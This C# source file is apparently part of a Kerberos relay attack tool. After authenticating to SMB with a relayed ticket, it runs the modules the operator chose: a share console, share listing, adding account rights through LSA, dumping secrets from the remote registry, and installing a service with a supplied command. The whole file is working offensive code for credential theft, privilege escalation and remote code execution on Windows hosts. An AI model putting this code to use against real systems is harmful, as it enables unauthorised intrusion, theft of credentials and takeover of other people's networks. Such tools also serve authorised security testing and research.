﻿using System;
using System.Linq;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Smb
    {
        public static void Connect()
        {
            apRep1 = smbClient.Login(ticket, out bool success);
            if (success)
            {
                Console.WriteLine("[+] SMB session established");

                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        Attacks.Smb.Shares.smbConsole(smbClient);
                    }
                    if (attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbClient);
                    }
                    if (attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
                    }
                    if (attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbClient, false);
                    }
                    if (attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Smb.ServiceManager.serviceInstall(smbClient, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                smbClient.Logoff();
                smbClient.Disconnect();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
            }
        }
    }
}